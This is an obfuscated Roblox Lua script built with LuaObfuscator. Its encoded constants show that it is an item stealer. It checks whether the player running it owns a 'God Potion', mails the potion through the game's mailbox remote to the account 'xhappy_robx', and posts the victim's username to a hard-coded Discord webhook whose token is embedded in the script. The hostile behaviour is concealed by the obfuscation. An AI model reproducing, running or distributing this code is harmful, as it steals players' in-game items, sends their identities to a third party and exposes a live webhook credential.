--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.10.8) ~  Much Love, Ferib 

]]--

local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function() return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...) local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30) if (v1(v30,2)==81) then v19=v0(v3(v30,1,1));return "";else local v83=0;local v84;while true do if (v83==0) then v84=v2(v0(v30,16));if v19 then local v98=v5(v84,v19);v19=nil;return v98;else return v84;end break;end end end end);local function v20(v31,v32,v33) if v33 then local v85=(v31/(2^(v32-(2 -1))))%(2^(((v33-(2 -1)) -(v32-(1 -(877 -(282 + 595))))) + (2 -1))) ;return v85-(v85%(620 -(555 + 64))) ;else local v86=(2568 -(1523 + 114)) -(857 + 74) ;local v87;while true do if (v86==0) then v87=(570 -(367 + 201))^(v32-(928 -(214 + 713))) ;return (((v31%(v87 + v87))>=v87) and (1 + 0)) or (0 + 0) ;end end end end local function v21() local v34=v1(v16,v18,v18);v18=v18 + 1 ;return v34;end local function v22() local v35=0 + 0 ;local v36;local v37;while true do if (v35==(1 -0)) then return (v37 * (1321 -(68 + 997))) + v36 ;end if (v35==0) then v36,v37=v1(v16,v18,v18 + ((1389 -(32 + 85)) -(222 + 4 + 1044)) );v18=v18 + (8 -6) ;v35=1;end end end local function v23() local v38,v39,v40,v41=v1(v16,v18,v18 + 3 );v18=v18 + 1 + 3 ;return (v41 * 16777216) + (v40 * (66493 -(892 + 65))) + (v39 * (610 -354)) + v38 ;end local function v24() local v42=0 -0 ;local v43;local v44;local v45;local v46;local v47;local v48;while true do if (v42==(1 -0)) then v45=351 -(87 + 263) ;v46=(v20(v44,181 -(67 + 113) ,15 + 5 ) * (2^(78 -46))) + v43 ;v42=2 + (0 -0) ;end if (v42==3) then if (v47==(0 -0)) then if (v46==(952 -(802 + 150))) then return v48 * (0 -0) ;else v47=1 -(438 -(145 + 293)) ;v45=0 + 0 ;end elseif (v47==(3044 -(915 + 82))) then return ((v46==(0 -0)) and (v48 * ((1 + (430 -(44 + 386)))/((1486 -(998 + 488)) -(0 + 0))))) or (v48 * NaN) ;end return v8(v48,v47-(2210 -(1069 + 118)) ) * (v45 + (v46/((4 -2)^((93 + 20) -61)))) ;end if (v42==(0 + 0)) then v43=v23();v44=v23();v42=1 -0 ;end if (v42==(2 + 0)) then v47=v20(v44,812 -(368 + 423) ,97 -(838 -(201 + 571)) );v48=((v20(v44,50 -(10 + 8) )==(3 -2)) and  -(443 -(416 + (1164 -(116 + 1022))))) or (3 -2) ;v42=2 + 1 ;end end end local function v25(v49) local v50;if  not v49 then v49=v23();if (v49==(0 -0)) then return "";end end v50=v3(v16,v18,(v18 + v49) -1 );v18=v18 + v49 ;local v51={};for v66=3 -2 , #v50 do v51[v66]=v2(v1(v3(v50,v66,v66)));end return v6(v51);end local v26=v23;local function v27(...) return {...},v12("#",...);end local function v28() local v52=(function() return 0;end)();local v53=(function() return;end)();local v54=(function() return;end)();local v55=(function() return;end)();local v56=(function() return;end)();local v57=(function() return;end)();local v58=(function() return;end)();local v59=(function() return;end)();while true do local v68=(function() return 0 + 0 ;end)();while true do if ((0 + 0)~=v68) then else if (2==v52) then v57[ #"91("]=(function() return v21();end)();for v99= #"!",v23() do local v100=(function() return v21();end)();if (v20(v100, #"[", #"\\")~=0) then else local v102=(function() return 0;end)();local v103=(function() return;end)();local v104=(function() return;end)();local v105=(function() return;end)();while true do if (v102==0) then local v115=(function() return 0;end)();local v116=(function() return;end)();while true do if ((0 + 0)==v115) then v116=(function() return 0 + 0 ;end)();while true do if (v116~=1) then else v102=(function() return 1 -0 ;end)();break;end if (v116==0) then v103=(function() return v20(v100,2 -0 , #"xxx");end)();v104=(function() return v20(v100, #"0313",6);end)();v116=(function() return 1;end)();end end break;end end end if (v102==1) then local v117=(function() return 0;end)();while true do if (0==v117) then v105=(function() return {v22(),v22(),nil,nil};end)();if (v103==(0 -0)) then local v276=(function() return 0;end)();local v277=(function() return;end)();while true do if (v276~=0) then else v277=(function() return 0;end)();while true do if (v277==0) then v105[ #"xxx"]=(function() return v22();end)();v105[ #".dev"]=(function() return v22();end)();break;end end break;end end elseif (v103== #"}") then v105[ #"asd"]=(function() return v23();end)();elseif (v103==(2 + 0)) then v105[ #"gha"]=(function() return v23() -((2 + 0)^(412 -(115 + 281))) ;end)();elseif (v103== #"asd") then local v359=(function() return 0 -0 ;end)();local v360=(function() return;end)();while true do if (v359~=(0 + 0)) then else v360=(function() return 0 -0 ;end)();while true do if (v360==0) then v105[ #"asd"]=(function() return v23() -(2^16) ;end)();v105[ #"xnxx"]=(function() return v22();end)();break;end end break;end end end v117=(function() return 3 -2 ;end)();end if (v117==(868 -(550 + 317))) then v102=(function() return 2 -0 ;end)();break;end end end if (v102~=3) then else if (v20(v104, #"xxx", #"xnx")== #"}") then v105[ #"0836"]=(function() return v59[v105[ #"0836"]];end)();end v54[v99]=(function() return v105;end)();break;end if (v102~=2) then else if (v20(v104, #"|", #"~")~= #"[") then else v105[2 -0 ]=(function() return v59[v105[5 -3 ]];end)();end if (v20(v104,287 -(134 + 151) ,1667 -(970 + 695) )~= #",") then else v105[ #"91("]=(function() return v59[v105[ #"19("]];end)();end v102=(function() return 3;end)();end end end end for v101= #"}",v23() do v55,v101,v28=(function() return v53(v55,v101,v28);end)();end return v57;end if (v52==0) then local v96=(function() return 0 -0 ;end)();while true do if (v96~=(1991 -(582 + 1408))) then else v55=(function() return {};end)();v56=(function() return {};end)();v96=(function() return 6 -4 ;end)();end if (v96==2) then v52=(function() return 1 -0 ;end)();break;end if (v96~=0) then else v53=(function() return function(v110,v111,v112) local v113=(function() return 0 -0 ;end)();local v114=(function() return;end)();while true do if (v113==0) then v114=(function() return 1824 -(1195 + 629) ;end)();while true do if (v114~=(0 -0)) then else local v278=(function() return 0;end)();while true do if (v278==(241 -(187 + 54))) then v110[v111-#"{" ]=(function() return v112();end)();return v110,v111,v112;end end end end break;end end end;end)();v54=(function() return {};end)();v96=(function() return 781 -(162 + 618) ;end)();end end end v68=(function() return 1 + 0 ;end)();end if (v68==(1 + 0)) then if (v52==(1 -0)) then local v97=(function() return 0 -0 ;end)();while true do if (v97==(1 + 0)) then v59=(function() return {};end)();for v106= #"~",v58 do local v107=(function() return 1636 -(1373 + 263) ;end)();local v108=(function() return;end)();local v109=(function() return;end)();while true do if (v107==(1001 -(451 + 549))) then if (v108== #",") then v109=(function() return v21()~=(0 + 0) ;end)();elseif (v108==2) then v109=(function() return v24();end)();elseif (v108== #"-19") then v109=(function() return v25();end)();end v59[v106]=(function() return v109;end)();break;end if (v107~=(0 -0)) then else local v120=(function() return 0;end)();local v121=(function() return;end)();while true do if (v120==0) then v121=(function() return 0;end)();while true do if (v121==1) then v107=(function() return 1;end)();break;end if (v121==(0 -0)) then v108=(function() return v21();end)();v109=(function() return nil;end)();v121=(function() return 1;end)();end end break;end end end end end v97=(function() return 2;end)();end if (v97==(1384 -(746 + 638))) then v57=(function() return {v54,v55,nil,v56};end)();v58=(function() return v23();end)();v97=(function() return 1;end)();end if (v97~=(2 -0)) then else v52=(function() return 343 -(218 + 123) ;end)();break;end end end break;end end end end local function v29(v60,v61,v62) local v63=v60[1582 -(1535 + 46) ];local v64=v60[2 + 0 ];local v65=v60[1 + 2 ];return function(...) local v69=v63;local v70=v64;local v71=v65;local v72=v27;local v73=1;local v74= -(561 -(306 + 254));local v75={};local v76={...};local v77=v12("#",...) -(1 -0) ;local v78={};local v79={};for v88=0,v77 do if (v88>=v71) then v75[v88-v71 ]=v76[v88 + (1468 -(899 + 568)) ];else v79[v88]=v76[v88 + 1 + 0 ];end end local v80=(v77-v71) + ((4 -2) -1) ;local v81;local v82;while true do v81=v69[v73];v82=v81[604 -(268 + 335) ];if ((v82<=(326 -(60 + 230))) or (1876>=2541)) then if (v82<=(589 -(426 + 146))) then if (v82<=8) then if ((1782<=3772) and ((v82<=((1 -0) + 2)) or (2809>4869))) then if (v82<=((1962 -(351 + 154)) -(282 + 1174))) then if ((568<=911) and (v82==(811 -(569 + 242)))) then local v125=0 -0 ;local v126;while true do if (v125==(0 + 0)) then v126=v81[1026 -(706 + 318) ];v79[v126](v13(v79,v126 + (1252 -(721 + 530)) ,v81[1274 -((2519 -(1281 + 293)) + 326) ]));break;end end else v79[v81[4 -2 ]]= #v79[v81[3 + 0 ]];end elseif (v82>(702 -(271 + 429))) then local v128=v81[2 + 0 ];v79[v128]=v79[v128](v13(v79,v128 + (1501 -(1408 + 92)) ,v81[1089 -(461 + (891 -(28 + 238))) ]));else v79[v81[1290 -(993 + 295) ]]=v79[v81[1 + 2 ]];end elseif ((3285<4228) and (v82<=(1176 -(418 + 753)))) then if ((v82==(2 + 2)) or (4700<813)) then v79[v81[2]]={};else local v133=v81[1 + 1 ];v79[v133]=v79[v133]();end elseif (v82<=6) then v62[v81[6 -3 ]]=v79[v81[2]];elseif (v82>7) then if ((3916>3328) and (v79[v81[1 + 1 ]]==v79[v81[4]])) then v73=v73 + 1 + 0 ;else v73=v81[3];end else local v227=v81[531 -(406 + 123) ];v79[v227]=v79[v227](v13(v79,v227 + 1 ,v81[1772 -(1749 + 20) ]));end elseif ((2500<3839) and (v82<=(3 + 9))) then if ((507==507) and (v82<=(1332 -(1249 + 73)))) then if (v82==((1563 -(1381 + 178)) + 5)) then local v137=v81[1148 -(466 + 679) ];local v138=v79[v137];for v213=v137 + (2 -1) ,v81[4 + 0 ] do v138=v138   .. v79[v213] ;end v79[v81[5 -(3 + 0) ]]=v138;elseif (v79[v81[2]]==v81[4]) then v73=v73 + (1901 -(106 + 1794)) ;else v73=v81[2 + 1 ];end elseif (v82==11) then v73=v81[1 + 2 ];else local v141=v81[2];do return v13(v79,v141,v141 + v81[1 + 2 ] );end end elseif ((240<=3165) and (v82<=(41 -27))) then if ((3199<4050) and (v82==(34 -21))) then v79[v81[2]]=v81[117 -(4 + 110) ]~=(584 -(57 + 527)) ;else do return;end end elseif ((834>=805) and (v82<=15)) then local v143=1427 -(41 + (4778 -3392)) ;local v144;local v145;local v146;while true do if (v143==(104 -(17 + 45 + 41))) then v146=0 + 0 ;for v295=v144,v81[8 -4 ] do v146=v146 + (2 -1) ;v79[v295]=v145[v146];end break;end if ((166 -(122 + 44))==v143) then v144=v81[2 -0 ];v145={v79[v144](v79[v144 + 1 + 0 ])};v143=1 + 0 ;end end elseif (v82>16) then local v230=v81[3 -1 ];local v231=v79[v81[(61 + 7) -(30 + 35) ]];v79[v230 + 1 ]=v231;v79[v230]=v231[v81[3 + 1 ]];else v79[v81[2]]=v79[v81[(853 + 407) -(1043 + 214) ]][v79[v81[4]]];end elseif ((v82<=(98 -(122 -50))) or (3812<2316) or (4951<4430)) then if (v82<=(1233 -(323 + (2045 -(1074 + 82))))) then if (v82<=19) then if (v82>(48 -30)) then if ((96==96) and  not v79[v81[(1275 -693) -(361 + 219) ]]) then v73=v73 + (321 -(53 + (2051 -(214 + 1570)))) ;else v73=v81[1 + 2 ];end else v79[v81[415 -(15 + (1853 -(990 + 465))) ]]=v62[v81[985 -(18 + 964) ]];end elseif ((v82>20) or (2739>4008)) then local v149=v81[11 -8 ];local v150=v79[v149];for v214=v149 + 1 ,v81[4] do v150=v150   .. v79[v214] ;end v79[v81[2]]=v150;else v79[v81[2 + 0 ]]=v81[3];end elseif ((v82<=(7 + 8 + 8)) or (23==1134)) then if ((v82>(872 -(20 + 830))) or (2652<=1533)) then local v154=0 + 0 ;local v155;while true do if ((v154==(126 -(116 + 10))) or (2693>=4111)) then v155=v81[1 + 1 ];v79[v155](v79[v155 + ((322 + 417) -(542 + 196)) ]);break;end end else v79[v81[3 -1 ]]=v81[1 + 2 ]~=(0 + 0) ;end elseif (v82<=(9 + 15)) then if (v79[v81[(4 + 0) -(7 -5) ]] or (4316<=2146)) then v73=v73 + (2 -1) ;else v73=v81[1554 -(1126 + 425) ];end elseif ((v82==(430 -((1844 -(1668 + 58)) + 287))) or (3598<1460)) then v79[v81[7 -5 ]]=v61[v81[3]];else v79[v81[(1749 -(512 + 114)) -(118 + 1003) ]]=v79[v81[8 -5 ]][v81[(993 -612) -(142 + 235) ]];end elseif (v82<=(140 -109)) then if ((v82<=(7 + 21)) or (4116<1192)) then if (v82==(1004 -(553 + 424))) then if  not v79[v81[2]] then v73=v73 + (1 -0) ;else v73=v81[3 + 0 ];end else local v157=v81[2];v79[v157]=v79[v157](v79[v157 + 1 + 0 ]);end elseif (v82<=(17 + 12)) then v79[v81[1 + (1 -0) ]]();elseif ((v82==(18 + 12)) or (3546<=2809)) then local v244=v81[4 -2 ];v79[v244]=v79[v244]();else local v246=v81[2];v79[v246](v13(v79,v246 + (2 -1) ,v81[6 -3 ]));end elseif ((4904>2166) and (v82<=33)) then if (v82>(10 + 22)) then v79[v81[2]]=v61[v81[14 -11 ]];else v79[v81[755 -(239 + 514) ]]=v79[v81[2 + 1 ]];end elseif (v82<=34) then for v215=v81[1331 -(797 + 532) ],v81[(10 -7) + 0 + 0 ] do v79[v215]=nil;end elseif ((v82>(12 + 23)) or (3377<=903)) then if (v81[4 -2 ]==v79[v81[1206 -(70 + 303 + 829) ]]) then v73=v73 + (732 -(476 + 255)) ;else v73=v81[1133 -(369 + 761) ];end else do return v79[v81[2 + 0 ]];end end elseif (v82<=54) then if (v82<=(81 -36)) then if (v82<=(75 -(31 + 4))) then if (v82<=(276 -(64 + 174))) then if (v82==(6 + (104 -73))) then v79[v81[2 -0 ]][v81[339 -(144 + 192) ]]=v79[v81[220 -(42 + 174) ]];else do return;end end elseif (v82==39) then local v165=0;local v166;local v167;local v168;while true do if ((3976>=439) and (v165==(0 + 0))) then v166=v81[2];v167={v79[v166](v79[v166 + 1 + 0 ])};v165=(3499 -(109 + 1885)) -(363 + 1141) ;end if (v165==(1581 -(1183 + 397))) then v168=0 -0 ;for v299=v166,v81[3 + 1 ] do local v300=0 + 0 ;while true do if ((3752==3752) and (v300==(1975 -(1913 + 62)))) then v168=v168 + 1 + 0 ;v79[v299]=v167[v168];break;end end end break;end end else v79[v81[5 -3 ]]();end elseif ((4046>2695) and (v82<=42)) then if ((109>=90) and (v82==(1974 -(565 + 1368)))) then if ((4978>2905) and (v81[2]==v79[v81[15 -11 ]])) then v73=v73 + (1662 -(1477 + (1653 -(1269 + 200)))) ;else v73=v81[(5 -2) -0 ];end else local v169=0 + 0 ;local v170;local v171;local v172;while true do if ((v169==(857 -(564 + 292))) or (3026<=2280)) then v172=v81[4 -1 ];for v301=2 -1 ,v172 do v171[v301]=v79[v170 + v301 ];end break;end if (v169==(304 -(244 + 60))) then v170=v81[2 + 0 ];v171=v79[v170];v169=477 -((856 -(98 + 717)) + 435) ;end end end elseif ((v82<=43) or (1653<=1108)) then v73=v81[1004 -(938 + 63) ];elseif (v82>(34 + 10)) then local v248=0;local v249;local v250;local v251;while true do if (v248==(1126 -(936 + 189))) then v251={};v250=v10({},{__index=function(v332,v333) local v334=v251[v333];return v334[1 + 0 ][v334[1615 -(1565 + 48) ]];end,__newindex=function(v335,v336,v337) local v338=0 + 0 ;local v339;while true do if (v338==0) then v339=v251[v336];v339[1139 -(782 + 356) ][v339[269 -(176 + 91) ]]=v337;break;end end end});v248=4 -(828 -(802 + 24)) ;end if ((2909>2609) and (v248==(2 -0))) then for v340=1093 -(975 + 117) ,v81[1879 -((270 -113) + 1718) ] do v73=v73 + 1 + 0 ;local v341=v69[v73];if (v341[3 -(2 -0) ]==(109 -77)) then v251[v340-(1019 -(697 + 321)) ]={v79,v341[5 -2 ]};else v251[v340-(2 -(1 + 0)) ]={v61,v341[5 -2 ]};end v78[ #v78 + 1 ]=v251;end v79[v81[2]]=v29(v249,v250,v62);break;end if ((v248==(0 + 0)) or (3545==3197)) then v249=v70[v81[7 -4 ]];v250=nil;v248=1228 -(322 + 196 + 709) ;end end else local v252=v81[2];local v253=v79[v252];for v286=v252 + (612 -(602 + 9)) ,v81[(3315 -2123) -(449 + 740) ] do v7(v253,v79[v286]);end end elseif (v82<=(921 -(826 + 46))) then if ((2394>373) and (v82<=(994 -(245 + 702)))) then if ((4155<=4232) and (v82==(145 -99))) then v79[v81[1 + 1 ]]=v62[v81[1901 -(260 + 1638) ]];elseif ((v79[v81[2]]==v81[4]) or (3581==3473)) then v73=v73 + (441 -(382 + 58)) ;else v73=v81[(29 -20) -6 ];end elseif (v82==48) then local v176=v81[2];v79[v176](v79[v176 + 1 ]);else v79[v81[2 + 0 ]]= #v79[v81[3]];end elseif ((757>194) and (4995>3348) and (v82<=51)) then if (v82==(103 -53)) then for v217=v81[5 -3 ],v81[1208 -(902 + 303) ] do v79[v217]=nil;end else v79[v81[3 -1 ]]=v79[v81[6 -3 ]][v79[v81[1 + 3 ]]];end elseif (v82<=52) then v62[v81[1693 -(1121 + 569) ]]=v79[v81[2]];elseif (v82==53) then if ((v79[v81[2]]==v79[v81[218 -(22 + 192) ]]) or (754>3724)) then v73=v73 + 1 ;else v73=v81[686 -(483 + 200) ];end else v79[v81[1465 -(1404 + 59) ]]=v29(v70[v81[3]],nil,v62);end elseif (v82<=63) then if (v82<=(158 -100)) then if (v82<=((27 + 48) -19)) then if (((217>=57) and (v82==(820 -(468 + 121 + 176)))) or (31>=1398)) then v79[v81[2]][v81[565 -(276 + 58 + 228) ]]=v79[v81[4]];else local v184=v81[6 -4 ];local v185=v79[v81[6 -(3 + 0) ]];v79[v184 + (1 -0) ]=v185;v79[v184]=v185[v81[1 + 1 + 2 ]];end elseif (v82==(293 -(141 + 95))) then v79[v81[(1435 -(797 + 636)) + 0 ]]=v29(v70[v81[7 -4 ]],nil,v62);else v79[v81[9 -7 ]][v81[3]]=v81[9 -5 ];end elseif ((v82<=((1634 -(1427 + 192)) + 45)) or (2070>=4037)) then if (v82==59) then local v192=v81[5 -3 ];local v193=v81[3 + 1 ];local v194=v192 + 2 + 0 ;local v195={v79[v192](v79[v192 + 1 + 0 ],v79[v194])};for v219=1,v193 do v79[v194 + v219 ]=v195[v219];end local v196=v195[(148 + 16) -(92 + 33 + 38) ];if v196 then local v256=0 + 0 ;while true do if ((3196<=4872) and (2705==2705) and ((0 -(326 -(192 + 134)))==v256)) then v79[v194]=v196;v73=v81[768 -(574 + 191) ];break;end end else v73=v73 + 1 + 0 ;end elseif v79[v81[4 -2 ]] then v73=v73 + 1 + 0 ;else v73=v81[(2128 -(316 + 960)) -(254 + 595) ];end elseif (v82<=(187 -(55 + 40 + 31))) then v79[v81[2 -0 ]]={};elseif (v82==62) then do return v79[v81[1792 -(573 + 1217) ]];end else local v258=v81[(4 + 1) -3 ];local v259={};for v287=1 + 0 , #v78 do local v288=v78[v287];for v305=0 -(0 + 0) , #v288 do local v306=v288[v305];local v307=v306[940 -(714 + 225) ];local v308=v306[5 -3 ];if ((v307==v79) and (v308>=v258)) then v259[v308]=v307[v308];v306[(3 -2) -0 ]=v259;end end end end elseif ((61==61) and (v82<=(8 + 60))) then if (v82<=(93 -28)) then if ((v82==64) or (699>=1296)) then local v198=v81[2];local v199=v79[v198];local v200=v81[809 -(118 + 688) ];for v222=49 -(25 + 23) ,v200 do v199[v222]=v79[v198 + v222 ];end else v61[v81[(552 -(83 + 468)) + 2 ]]=v79[v81[1888 -(927 + 959) ]];end elseif ((v82<=(1872 -(1202 + 604))) or (1783>=3616)) then v79[v81[6 -4 ]]=v81[735 -(16 + 716) ];elseif ((3326==3326) and (v82==(128 -61))) then v61[v81[(466 -366) -(11 + 86) ]]=v79[v81[4 -2 ]];else local v262=v81[(477 -190) -(175 + 110) ];v79[v262]=v79[v262](v79[v262 + (2 -1) ]);end elseif (v82<=((955 -610) -275)) then if ((1433<=3878) and ((v82>(1865 -(503 + 1293))) or (3913>4527))) then local v205=v81[5 -3 ];local v206={};for v225=1, #v78 do local v226=v78[v225];for v264=0 + 0 , #v226 do local v265=1061 -(810 + 251) ;local v266;local v267;local v268;while true do if (v265==0) then v266=v226[v264];v267=v266[1 + (325 -(45 + 280)) ];v265=1 + 0 ;end if ((4376>817) and (v265==(1 + 0))) then v268=v266[535 -(43 + 490) ];if ((4861>824) and (v267==v79) and (v268>=v205)) then v206[v268]=v267[v268];v266[734 -(711 + 22) ]=v206;end break;end end end end else local v207=0 -0 ;local v208;local v209;local v210;while true do if ((861 -(240 + 619))==v207) then for v309=1 + 0 ,v81[(5 + 0) -1 ] do local v310=0 + 0 ;local v311;while true do if (v310==(1744 -(1344 + 350 + 50))) then v73=v73 + 1 ;v311=v69[v73];v310=1;end if (v310==(406 -(94 + 161 + 150))) then if (v311[1]==(18 + 14)) then v210[v309-(1 + 0 + 0) ]={v79,v311[9 -6 ]};else v210[v309-(1740 -(404 + 1335)) ]={v61,v311[2 + 1 ]};end v78[ #v78 + 1 + 0 ]=v210;break;end end end v79[v81[2]]=v29(v208,v209,v62);break;end if ((v207==(1912 -(340 + 1571))) or (1383>=2131) or (1583==1735)) then v210={};v209=v10({},{__index=function(v312,v313) local v314=337 -(10 + 327) ;local v315;while true do if ((v314==(0 + 0)) or (2981==2350)) then v315=v210[v313];return v315[339 -(118 + 220) ][v315[2]];end end end,__newindex=function(v316,v317,v318) local v319=v210[v317];v319[1 + 0 ][v319[451 -(108 + 341) ]]=v318;end});v207=1 + 1 ;end if (v207==(0 -0)) then v208=v70[v81[1496 -(711 + 782) ]];v209=nil;v207=1 -0 ;end end end elseif ((v82<=(540 -(270 + 199))) or (4466<=493)) then v79[v81[1 + 1 ]][v81[1822 -(580 + 1239) ]]=v81[4];elseif (v82==(213 -141)) then local v269=v81[2];local v270=v81[4 + 0 ];local v271=v269 + 1 + 1 ;local v272={v79[v269](v79[v269 + (2 -1) ],v79[v271])};for v291=1 + 0 ,v270 do v79[v271 + v291 ]=v272[v291];end local v273=v272[1168 -(645 + 522) ];if (v273 or (2547<=1987)) then v79[v271]=v273;v73=v81[1793 -(1010 + 780) ];else v73=v73 + 1 + 0 ;end else v79[v81[9 -7 ]]=v79[v81[8 -5 ]][v81[4]];end v73=v73 + (1837 -(1045 + 791)) ;end end;end return v29(v28(),{},v17)(...);end return v15("LOL!243Q00028Q00027Q004003043Q0077616974026Q002040026Q000840026Q001440030B3Q0073656E645F706F74696F6E026Q00F03F030A3Q006861735F706F74696F6E030B3Q007265642Q656D5F66722Q6503123Q00676F645F706F74696F6E5F76697369626C6503073Q00776562682Q6F6B03073Q00636F6E74656E7403043Q0067616D6503073Q00506C6179657273030B3Q004C6F63616C506C6179657203043Q004E616D65031F3Q002068617320676F6420706F74696F6E20696E20666F7265766572207061636B03083Q00757365726E616D65030C3Q00466F7265766572207061636B03043Q007461736B030A3Q00476F6420506F74696F6E03083Q0049734C6F6164656403053Q007063612Q6C03073Q0072657175697265030A3Q004765745365727669636503113Q005265706C69636174656453746F7261676503073Q004C69627261727903063Q00436C69656E7403043Q00536176652Q033Q00476574031C3Q00726278612Q73657469643A2Q2F3133303834333638323537342Q3335026Q001040030B3Q007868612Q70795F726F627803793Q00682Q7470733A2Q2F646973636F72642E636F6D2F6170692F776562682Q6F6B732F31333Q3038343830343039353730393239342F4E424C5933636C545354447636444D36355F2Q70486C554338654C7A6E726B493565794B586B72645F3756723541546F35653943334137765F654775724B34724A766659026Q00244000933Q0012143Q00014Q0032000100073Q00260A3Q00090001000200040B3Q0009000100122E000800033Q001214000900044Q00170008000200012Q0032000500063Q0012143Q00053Q00260A3Q00420001000600040B3Q0042000100062D00083Q000100022Q00203Q00024Q00203Q00013Q001234000800073Q00122E000800034Q001E0008000100020006180008009100013Q00040B3Q00910001001214000800014Q0032000900093Q00260A000800200001000800040B3Q0020000100122E000A00094Q001E000A000100022Q00020009000A3Q0006180009001F00013Q00040B3Q001F000100122E000A00074Q0002000B00094Q0017000A00020001001214000800023Q00260A000800280001000100040B3Q0028000100122E000A000A4Q001D000A0001000100122E000A00033Q001214000B00064Q0017000A00020001001214000800083Q00260A000800150001000200040B3Q0015000100122E000A000B4Q001E000A00010002000618000A003A00013Q00040B3Q003A000100122E000A000C4Q0002000B00024Q0004000C3Q000200122E000D000E3Q00201A000D000D000F00201A000D000D001000201A000D000D0011001214000E00124Q0015000D000D000E001037000C000D000D003047000C001300142Q001F000A000C000100122E000A00153Q00201A000A000A00032Q0002000B00034Q0017000A0002000100040B3Q000F000100040B3Q0015000100040B3Q000F000100040B3Q0091000100260A3Q00530001000800040B3Q005300012Q0004000800013Q001214000900164Q002A0008000100012Q0002000400083Q000239000800013Q0012340008000C3Q00122E000800033Q001214000900054Q001700080002000100122E0008000E3Q0020380008000800172Q00440008000200020006180008004A00013Q00040B3Q004A00010012143Q00023Q00260A3Q007A0001000500040B3Q007A0001001214000800013Q00260A0008005D0001000800040B3Q005D000100122E000900183Q00062D000A0002000100012Q00203Q00064Q001700090002000100040B3Q00680001000E29000100560001000800040B3Q0056000100122E000900033Q001214000A00084Q001700090002000100122E000900183Q00062D000A0003000100012Q00203Q00054Q0017000900020001001214000800083Q00040B3Q005600010006180005005500013Q00040B3Q005500010006180006005500013Q00040B3Q0055000100122E000800193Q00122E0009000E3Q00203800090009001A001214000B001B4Q00030009000B000200201A00090009001C00201A00090009001D00201A00090009001E2Q004400080002000200201A00080008001F2Q001E0008000100022Q0002000500083Q001214000700203Q0012143Q00213Q00260A3Q00870001002100040B3Q0087000100062D00080004000100022Q00203Q00064Q00203Q00073Q0012340008000B3Q000239000800053Q0012340008000A3Q00062D00080006000100022Q00203Q00054Q00203Q00043Q001234000800093Q0012143Q00063Q00260A3Q00020001000100040B3Q000200012Q0004000800013Q001214000900224Q002A0008000100012Q0002000100083Q001214000200233Q001214000300243Q0012143Q00083Q00040B3Q000200012Q00468Q000E3Q00013Q00073Q00163Q00028Q00026Q00084003043Q0067616D65030A3Q004765745365727669636503113Q005265706C69636174656453746F7261676503073Q004E6574776F726B030D3Q004D61696C626F783A2053656E64030C3Q00496E766F6B6553657276657203073Q00776562682Q6F6B03073Q00636F6E74656E7403073Q00506C6179657273030B3Q004C6F63616C506C6179657203043Q004E616D6503103Q002073656E7420676F6420706F74696F6E03083Q00757365726E616D6503093Q004D61696C2073656E7403043Q006D61746803063Q0072616E646F6D026Q00F03F027Q0040030B3Q00506F74696F6E2073656E74030A3Q00436F6E73756D61626C65014D3Q001214000100014Q0032000200063Q00260A000100120001000200040B3Q0012000100122E000700033Q002038000700070004001214000900054Q000300070009000200201A00070007000600201A0007000700070020380007000700082Q0002000900024Q0002000A00034Q0002000B00044Q0002000C00054Q0002000D00064Q001F0007000D000100040B3Q004C000100260A000100310001000100040B3Q00310001001214000700013Q00260A0007002C0001000100040B3Q002C000100122E000800094Q001900096Q0004000A3Q000200122E000B00033Q00201A000B000B000B00201A000B000B000C00201A000B000B000D001214000C000E4Q0015000B000B000C001037000A000A000B003047000A000F00102Q001F0008000A00012Q0019000800013Q00122E000900113Q00201A000900090012001214000A00134Q0019000B00014Q0031000B000B4Q00030009000B00022Q0033000200080009001214000700133Q00260A000700150001001300040B3Q00150001001214000100133Q00040B3Q0031000100040B3Q0015000100260A0001003E0001001400040B3Q003E0001001214000700013Q00260A000700390001000100040B3Q003900012Q000200055Q001214000600133Q001214000700133Q00260A000700340001001300040B3Q00340001001214000100023Q00040B3Q003E000100040B3Q0034000100260A000100020001001300040B3Q00020001001214000700013Q00260A000700450001001300040B3Q00450001001214000100143Q00040B3Q0002000100260A000700410001000100040B3Q00410001001214000300153Q001214000400163Q001214000700133Q00040B3Q0041000100040B3Q000200012Q000E3Q00017Q00013Q0003053Q007063612Q6C02063Q00122E000200013Q00062D00033Q000100022Q00203Q00014Q00208Q00170002000200012Q000E3Q00013Q00013Q00123Q00028Q0003043Q0067616D65030A3Q0047657453657276696365030B3Q00482Q747053657276696365030A3Q004A534F4E456E636F6465030C3Q00636F6E74656E742D7479706503103Q00612Q706C69636174696F6E2F6A736F6E026Q00F03F03073Q0072657175657374030C3Q00682Q74705F7265717565737403083Q00482Q7470506F73742Q033Q0073796E2Q033Q0055726C03043Q00426F647903063Q004D6574686F6403043Q00504F535403073Q0048656164657273027Q0040002E3Q0012143Q00014Q0032000100033Q00260A3Q00100001000100040B3Q0010000100122E000400023Q002038000400040003001214000600044Q00030004000600020020380004000400052Q001900066Q00030004000600022Q0002000100044Q000400043Q00010030470004000600072Q0002000200043Q0012143Q00083Q00260A3Q00260001000800040B3Q0026000100122E0004000A3Q00061B0004001D0001000100040B3Q001D000100122E000400093Q00061B0004001D0001000100040B3Q001D000100122E0004000B3Q00061B0004001D0001000100040B3Q001D000100122E0004000C3Q00201A000400040009001234000400094Q000400043Q00042Q0019000500013Q0010370004000D00050010370004000E00010030470004000F00100010370004001100022Q0002000300043Q0012143Q00123Q00260A3Q00020001001200040B3Q0002000100122E000400094Q0002000500034Q001700040002000100040B3Q002D000100040B3Q000200012Q000E3Q00017Q000C3Q0003043Q0067616D65030A3Q004765745365727669636503073Q00506C6179657273030B3Q004C6F63616C506C6179657203093Q00506C61796572477569030D3Q004578636C757369766553686F7003053Q004672616D65030A3Q004974656D734672616D65